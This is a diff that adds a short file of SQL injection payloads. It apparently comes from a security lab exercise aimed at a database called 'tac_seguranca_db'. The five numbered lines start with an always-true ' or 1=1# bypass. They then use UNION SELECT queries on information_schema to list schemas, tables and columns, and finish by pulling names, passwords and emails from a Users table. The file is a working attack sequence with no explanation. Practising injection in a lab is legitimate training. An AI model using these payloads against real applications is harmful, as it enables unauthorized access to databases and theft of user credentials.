@@ -1,0 +1,5 @@
+1- supino' or 1=1#
+2- supino' union all SELECT SCHEMA_NAME, null, null FROM information_schema.SCHEMATA#
+3- supino' union all SELECT TABLE_NAME, null, null FROM information_schema.TABLES where TABLE_SCHEMA = 'tac_seguranca_db'#
+3- supino' union all SELECT COLUMN_NAME, null, null FROM information_schema.COLUMNS where TABLE_NAME = 'Users'#
+3- supino' union all SELECT name, password, email FROM Users#
